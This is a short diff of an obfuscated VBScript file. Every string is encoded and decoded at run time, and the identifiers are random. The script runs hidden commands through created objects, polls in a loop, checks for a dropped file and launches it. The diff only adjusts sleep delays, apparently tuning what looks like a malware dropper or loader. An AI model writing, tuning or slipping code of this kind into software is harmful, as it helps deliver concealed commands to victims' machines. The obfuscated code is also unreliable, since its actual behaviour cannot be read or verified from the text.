@@ -98,7 +98,7 @@ dfgsej4t34skt.Close
 Set vbvcndr56yj = CreateObject(sfvbn45je4("XHuMLI}Y:hV_*fCjM$)I?^Z[9bHbVJ"))
 vbvcndr56yj.CurrentDirectory = sfvbn45je4("/d~9K0\R3K(in[shUiyRey") + sdfg3456w346w3678 + sfvbn45je4("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")
 vbvcndr56yj.Run tgj56k34
-wSript.sleep 5000
+wscript.sleep 2000
 vbvcndr56yj.Run gfyd5r6d546
 jgfgy56ke65 = true
 do While (jgfgy56ke65 = true)
@@ -113,7 +113,7 @@ do While (jgfgy56ke65 = true)
     wscript.sleep 1000
 Loop
 Set zxcas23w4 = CreateObject(sfvbn45je4("PlgImYYh>_-f3j+_}dd]z$[<K_\bL[LIyo<iFj<[ucEEFX^`u[=Y0j(g"))
-wscript.sleep 60000
+wscript.sleep 90000
 zcasdc3232 = sfvbn45je4("TyR9s06RwKhiz[yh9iWR8%")+ sdfg3456w346w3678 + sfvbn45je4("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + sfvbn45je4("Ws\-qpInqWB$yZ\b7bUX")
 If zxcas23w4.FileExists(zcasdc3232) Then
     vbvcndr56yj.Run sfvbn45je4("KDlm>_,d\hLWCh.#<nT,**2#],?&T(f$R[>n}[U!")
